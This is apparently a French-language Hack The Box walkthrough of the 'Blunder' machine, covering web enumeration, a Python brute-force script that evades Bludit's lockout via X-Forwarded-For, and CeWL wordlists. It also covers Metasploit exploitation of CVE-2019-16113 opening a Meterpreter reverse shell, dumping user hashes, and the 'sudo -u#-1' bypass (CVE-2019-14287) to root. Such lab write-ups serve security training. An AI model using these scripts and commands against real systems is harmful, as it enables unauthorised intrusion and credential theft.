---
layout: post
title: HTB - Blunder
subtitle: Hack The Box - Linux Machine - Easy 
gh-repo: 0xSs0rZ/0xSs0rZ.github.io
gh-badge: [star]
tags: [HTB, Linux, Bludit, Bruteforce, CeWL, Password list, CVE-2019-16113, RCE, Metasploit, cve-2019-14287, Sudo < 1.8.28, Sudo Bypass]
comments: false
---

![Logo](/img/Blunder_logo.png){: .center-block :}

## 1. User

~~~
root@Host-001:~/Bureau/htb/Blunder# nmap -sC -sV 10.10.10.191 > nmap.nmap
root@Host-001:~/Bureau/htb/Blunder# cat nmap.nmap 
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-10 09:26 CEST
Nmap scan report for 10.10.10.191
Host is up (0.16s latency).
Not shown: 998 filtered ports
PORT   STATE  SERVICE VERSION
21/tcp closed ftp
80/tcp open   http    Apache httpd 2.4.41 ((Ubuntu))
|_http-generator: Blunder
|_http-title: Blunder | A blunder of interesting facts

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 65.89 seconds
root@Host-001:~/Bureau/htb/Blunder# dirb http://10.10.10.191/

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Wed Jun 10 09:28:09 2020
URL_BASE: http://10.10.10.191/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.10.10.191/ ----
+ http://10.10.10.191/0 (CODE:200|SIZE:7562)                                   
+ http://10.10.10.191/about (CODE:200|SIZE:3281)                               
==> DIRECTORY: http://10.10.10.191/admin/                                      
+ http://10.10.10.191/cgi-bin/ (CODE:301|SIZE:0)                               
                                                                               
(!) FATAL: Too many errors connecting to host
    (Possible cause: COULDNT CONNECT)
                                                                               
-----------------
END_TIME: Wed Jun 10 09:54:01 2020
DOWNLOADED: 1278 - FOUND: 3
~~~

On visite http://10.10.10.191/admin/ il s'agit d'une interface d'admin de Bludit, un CMS

Code source:

~~~
	<!-- Favicon -->
	<link rel="shortcut icon" type="image/x-icon" href="/bl-kernel/img/favicon.png?version=3.9.2">

	<!-- CSS -->
	<link rel="stylesheet" type="text/css" href="http://10.10.10.191/bl-kernel/css/bootstrap.min.css?version=3.9.2">
<link rel="stylesheet" type="text/css" href="http://10.10.10.191/bl-kernel/admin/themes/booty/css/bludit.css?version=3.9.2">
<link rel="stylesheet" type="text/css" href="http://10.10.10.191/bl-kernel/admin/themes/booty/css/bludit.bootstrap.css?version=3.9.2">

	<!-- Javascript -->
	<script src="http://10.10.10.191/bl-kernel/js/jquery.min.js?version=3.9.2"></script>
<script src="http://10.10.10.191/bl-kernel/js/bootstrap.bundle.min.js?version=3.9.2"></script>

	<!-- Plugins -->
~~~

Il s'agit donc du CMS Bludit v.3.9.2

Il est possible de brute force cette version. Ref: [https://rastating.github.io/bludit-brute-force-mitigation-bypass/](https://rastating.github.io/bludit-brute-force-mitigation-bypass/)

Il y a un fichier robots.txt à la racine mais sans interet

~~~
root@Host-001:~/Bureau/htb/Blunder# dirb http://10.10.10.191 /usr/share/seclists/Discovery/Web-Content/common.txt -X .txt

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Wed Jun 10 10:18:02 2020
URL_BASE: http://10.10.10.191/
WORDLIST_FILES: /usr/share/seclists/Discovery/Web-Content/common.txt
EXTENSIONS_LIST: (.txt) | (.txt) [NUM = 1]

-----------------

                                                                              GENERATED WORDS: 4651

---- Scanning URL: http://10.10.10.191/ ----
                                                                                        + http://10.10.10.191/robots.txt (CODE:200|SIZE:22)                               
+ http://10.10.10.191/todo.txt (CODE:200|SIZE:118)
                                                                               
-----------------
END_TIME: Wed Jun 10 10:37:31 2020
DOWNLOADED: 4651 - FOUND: 2
root@Host-001:~/Bureau/htb/Blunder# 

Visiter http://10.10.10.191/todo.txt
~~~

Résultat: 

~~~
-Update the CMS
-Turn off FTP - DONE
-Remove old users - DONE
-Inform fergus that the new blog needs images - PENDING
~~~

User = fergus

On utilise le poc de rastating pour bruteforcer Bludit avec le user fergus

~~~
root@Host-001:~/Bureau/htb/Blunder# cat poc.py 
#!/usr/bin/env python3
import re
import requests

login_url = 'http://10.10.10.191/admin/login'
username = 'fergus'
#wordlist = []

passlist = open("/usr/share/wordlists/rockyou.txt", "r")
#for x in f:
#  print(x) 


# Generate 50 incorrect passwords
#for i in range(50):
#    wordlist.append('Password{i}'.format(i = i))

# Add the correct password to the end of the list
#wordlist.append('adminadmin')

for password in passlist:
    #print(password)
    password = password.replace("\n","")
    session = requests.Session()
    login_page = session.get(login_url)
    csrf_token = re.search('input.+?name="tokenCSRF".+?value="(.+?)"', login_page.text).group(1)

    print('[*] Trying: {p}'.format(p = password))

    headers = {
        'X-Forwarded-For': password,
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36',
        'Referer': login_url
    }

    data = {
        'tokenCSRF': csrf_token,
        'username': username,
        'password': password,
        'save': ''
    }

    login_result = session.post(login_url, headers = headers, data = data, allow_redirects = False)

    if 'location' in login_result.headers:
        if '/admin/dashboard' in login_result.headers['location']:
            print()
            print('SUCCESS: Password found!')
            print('Use {u}:{p} to login.'.format(u = username, p = password))
            print()
            break


root@Host-001:~/Bureau/htb/Blunder# 
~~~

Après plusieurs minutes toujours pas de résultats avec rockyou...

On va créer une liste de password avec CeWL

~~~
root@Host-001:~/Bureau/htb/Blunder# cewl -w wordlists.txt -d 10 -m 1 http://10.10.10.191/
CeWL 5.4.8 (Inclusion) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
root@Host-001:~/Bureau/htb/Blunder# cat wordlists.txt | head
Load
Plugins
to
the
of
and
a
Page
Include
Site
root@Host-001:~/Bureau/htb/Blunder# cat wordlists.txt | grep Roland
RolandDeschain
root@Host-001:~/Bureau/htb/Blunder# 
~~~

On relance le script avec cette wordlist

~~~
(...)

[*] Trying: RolandDeschain
()
SUCCESS: Password found!
Use fergus:RolandDeschain to login.
()
~~~

On peut se loguer a Bludit avec fergus:RolandDeschain

La version 3.9.2 de Bludit permet d'executer du code

Ref:

- [https://www.cvedetails.com/cve/CVE-2019-16113/](https://www.cvedetails.com/cve/CVE-2019-16113/)
- [https://github.com/bludit/bludit/issues/1081](https://github.com/bludit/bludit/issues/1081)

Il y a un module dans metasploit

~~~
msf5 > search Bludit

Matching Modules
================

   #  Name                                          Disclosure Date  Rank       Check  Description
   -  ----                                          ---------------  ----       -----  -----------
   0  exploit/linux/http/bludit_upload_images_exec  2019-09-07       excellent  Yes    Bludit Directory Traversal Image File Upload Vulnerability


msf5 > use exploit/linux/http/bludit_upload_images_exec
msf5 exploit(linux/http/bludit_upload_images_exec) > show options

Module options (exploit/linux/http/bludit_upload_images_exec):

   Name        Current Setting  Required  Description
   ----        ---------------  --------  -----------
   BLUDITPASS                   yes       The password for Bludit
   BLUDITUSER                   yes       The username for Bludit
   Proxies                      no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                       yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT       80               yes       The target port (TCP)
   SSL         false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI   /                yes       The base path for Bludit
   VHOST                        no        HTTP server virtual host


Exploit target:

   Id  Name
   --  ----
   0   Bludit v3.9.2


msf5 exploit(linux/http/bludit_upload_images_exec) > set BLUDITPASS RolandDeschain
BLUDITPASS => RolandDeschain
msf5 exploit(linux/http/bludit_upload_images_exec) > set BLUDITUSER fergus
BLUDITUSER => fergus
msf5 exploit(linux/http/bludit_upload_images_exec) > set RHOST 10.10.10.191
RHOST => 10.10.10.191
msf5 exploit(linux/http/bludit_upload_images_exec) > show options

Module options (exploit/linux/http/bludit_upload_images_exec):

   Name        Current Setting  Required  Description
   ----        ---------------  --------  -----------
   BLUDITPASS  RolandDeschain   yes       The password for Bludit
   BLUDITUSER  fergus           yes       The username for Bludit
   Proxies                      no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS      10.10.10.191     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT       80               yes       The target port (TCP)
   SSL         false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI   /                yes       The base path for Bludit
   VHOST                        no        HTTP server virtual host


Exploit target:

   Id  Name
   --  ----
   0   Bludit v3.9.2


msf5 exploit(linux/http/bludit_upload_images_exec) > exploit

[*] Started reverse TCP handler on 10.10.14.92:4444 
[+] Logged in as: fergus
[*] Retrieving UUID...
[*] Uploading DJsKaxmuhq.png...
[*] Uploading .htaccess...
[*] Executing DJsKaxmuhq.png...
[*] Sending stage (38288 bytes) to 10.10.10.191
[*] Meterpreter session 1 opened (10.10.14.92:4444 -> 10.10.10.191:35220) at 2020-06-10 11:47:19 +0200
[+] Deleted .htacces

meterpreter > getuid
Server username: www-data (33)
meterpreter > shell
Process 7737 created.
Channel 2 created.
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
python -c "import pty;pty.spawn('/bin/bash')"

ww-data@blunder:/var/www/bludit-3.9.2/bl-content$ cat databases/users.php
cat databases/users.php
<?php defined('BLUDIT') or die('Bludit CMS.'); ?>
{
    "admin": {
        "nickname": "Hugo",
        "firstName": "Hugo",
        "lastName": "",
        "role": "User",
        "password": "faca404fd5c0a31cf1897b823c695c85cffeb98d",
        "email": "",
        "registered": "2019-11-27 07:40:55",
        "tokenRemember": "",
        "tokenAuth": "b380cb62057e9da47afce66b4615107d",
        "tokenAuthTTL": "2009-03-15 14:00",
        "twitter": "",
        "facebook": "",
        "instagram": "",
        "codepen": "",
        "linkedin": "",
        "github": "",
        "gitlab": ""
    },
    "fergus": {
        "firstName": "",
        "lastName": "",
        "nickname": "",
        "description": "",
        "role": "author",
        "password": "be5e169cdf51bd4c878ae89a0a89de9cc0c9d8c7",
        "salt": "jqxpjfnv",
        "email": "",
        "registered": "2019-11-27 13:26:44",
        "tokenRemember": "",
        "tokenAuth": "0e8011811356c0c5bd2211cba8c50471",
        "tokenAuthTTL": "2009-03-15 14:00",
        "twitter": "",
        "facebook": "",
        "codepen": "",
        "instagram": "",
        "github": "",
        "gitlab": "",
        "linkedin": "",
        "mastodon": ""
    }
}www-data@blunder:/var/www/bludit-3.9.2/bl-content$ ls -la /home
ls -la /home
total 16
drwxr-xr-x  4 root  root  4096 Apr 27 14:31 .
drwxr-xr-x 21 root  root  4096 Apr 27 14:09 ..
drwxr-xr-x 16 hugo  hugo  4096 May 26 09:29 hugo
drwxr-xr-x 16 shaun shaun 4096 Apr 28 12:13 shaun
~~~

faca404fd5c0a31cf1897b823c695c85cffeb98d == Password120 en sha1: [https://sha1.gromweb.com/?hash=faca404fd5c0a31cf1897b823c695c85cffeb98d](https://sha1.gromweb.com/?hash=faca404fd5c0a31cf1897b823c695c85cffeb98d)

~~~
www-data@blunder:/var/www/bludit-3.9.2/bl-content$ su hugo
su hugo
Password: Password120

hugo@blunder:/var/www/bludit-3.9.2/bl-content$ cd /home/hugo
cd /home/hugo
hugo@blunder:~$ cat users.txt
cat users.txt
cat: users.txt: No such file or directory
hugo@blunder:~$ ls
ls
Desktop    Downloads  Pictures  Templates  Videos
Documents  Music      Public    user.txt
hugo@blunder:~$ cat user.txt
cat user.txt
e2aa5bddc5737359a6b3bc36d58cd3ee
~~~

## 2 - Root

~~~
hugo@blunder:~$ sudo -l
sudo -l
Password: Password120

Matching Defaults entries for hugo on blunder:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User hugo may run the following commands on blunder:
    (ALL, !root) /bin/bash
hugo@blunder:~$ sudo bash
sudo bash
Sorry, user hugo is not allowed to execute '/usr/bin/bash' as root on blunder.
hugo@blunder:~$ sudo /bin/bash
sudo /bin/bash
Sorry, user hugo is not allowed to execute '/bin/bash' as root on blunder.
hugo@blunder:~$ 
~~~

version ??

~~~
hugo@blunder:/var/www/bludit-3.9.2/bl-content/tmp$ sudo --version
sudo --version
Sudo version 1.8.25p1
Sudoers policy plugin version 1.8.25p1
Sudoers file grammar version 46
Sudoers I/O plugin version 1.8.25p1
hugo@blunder:/var/www/bludit-3.9.2/bl-content/tmp$ 
~~~

Sudo bypass: Ref:

- [https://www.exploit-db.com/exploits/47502](https://www.exploit-db.com/exploits/47502)
- [https://n0w4n.nl/sudo-security-bypass/](https://n0w4n.nl/sudo-security-bypass/)
- [https://blog.aquasec.com/cve-2019-14287-sudo-linux-vulnerability](https://blog.aquasec.com/cve-2019-14287-sudo-linux-vulnerability)

'CVE-2019-14287, a new security issue discovered by Joe Vennix of Apple Information Security, in all Sudo versions prior to version 1.8.28.'

~~~
hugo@blunder:~$ sudo -u#-1 /bin/bash
sudo -u#-1 /bin/bash
Password: Password120

root@blunder:/home/hugo# cat user.txt
cat user.txt
e2aa5bddc5737359a6b3bc36d58cd3ee
root@blunder:/home/hugo# cd ..
cd ..
root@blunder:/home# ls
ls
hugo  shaun
root@blunder:/home# cd ..
cd ..
root@blunder:/# ls
ls
bin    dev  home   lib64       media  proc  sbin  sys  var
boot   etc  lib    libx32      mnt    root  snap  tmp
cdrom  ftp  lib32  lost+found  opt    run   srv   usr
root@blunder:/# cd root	
cd root
root@blunder:/root# ls 
ls 
root.txt
root@blunder:/root# cat root.txt
cat root.txt
6be6ccc559976b4b6c2e9351b604bad6
root@blunder:/root# 
~~~

**Poursuivez avec :** 

[- HTB - Admirer](https://0xss0rz.github.io/2020-10-04-HTB-Admirer/)

[- HTB - Magic](https://0xss0rz.github.io/2020-08-24-HTB-Magic/)

[- HTB - Write Up Machine](https://0xss0rz.github.io/2020-08-04-HTB-Write-Up/)

[![CC-BY](https://mirrors.creativecommons.org/presskit/buttons/88x31/svg/by.svg)](https://creativecommons.org/licenses/by/4.0/)

This work is licensed under a [Creative Commons Attribution 4.0 International License](https://creativecommons.org/licenses/by/4.0/).
